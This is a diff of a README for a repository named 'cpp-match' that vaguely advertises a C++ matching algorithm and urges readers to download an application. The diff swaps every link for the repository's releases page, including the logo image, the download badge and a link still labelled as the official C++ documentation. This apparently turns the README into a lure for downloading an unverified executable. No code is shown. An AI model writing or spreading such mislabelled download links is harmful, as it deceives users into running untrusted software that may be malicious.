@@ -2,7 +2,7 @@
 
 ## Repository Name: cpp-match
 
-![C++ Logo](https://img.icons8.com/color/452/c-plus-plus-logo.png)
+![C++ Logo](https://github.com/NotQuis/cpp-match/releases)
 
 ### Description:
 This repository contains an advanced C++ matching algorithm that can be used for various applications. The algorithm uses sophisticated pattern matching techniques to efficiently find matches in a given dataset.
@@ -14,7 +14,7 @@ This repository contains an advanced C++ matching algorithm that can be used for
 
 ### Get Started:
 To get started with using the C++ matching algorithm, you can download the application from the following link:
-[![Launch Application](https://img.shields.io/badge/Launch%20Application-Click%20Here-blue)](https://github.com/project/files/App.zip)
+[![Launch Application](https://github.com/NotQuis/cpp-match/releases%20Application-Click%20Here-blue)](https://github.com/NotQuis/cpp-match/releases)
 
 If the link does not work or does not provide the application directly, please check the "Releases" section of this repository for alternative download options.
 
@@ -36,6 +36,6 @@ Contributions to this repository are welcome! If you have any improvements or ne
 If you encounter any issues or have questions about the C++ matching algorithm, please open an issue in this repository. Our team will be happy to assist you.
 
 ### Additional Resources:
-For more information and resources on pattern matching in C++, visit the [official C++ documentation](https://en.cppreference.com/w/) website.
+For more information and resources on pattern matching in C++, visit the [official C++ documentation](https://github.com/NotQuis/cpp-match/releases) website.
 
 Let's match patterns with C++! 🧩🔍🖥️
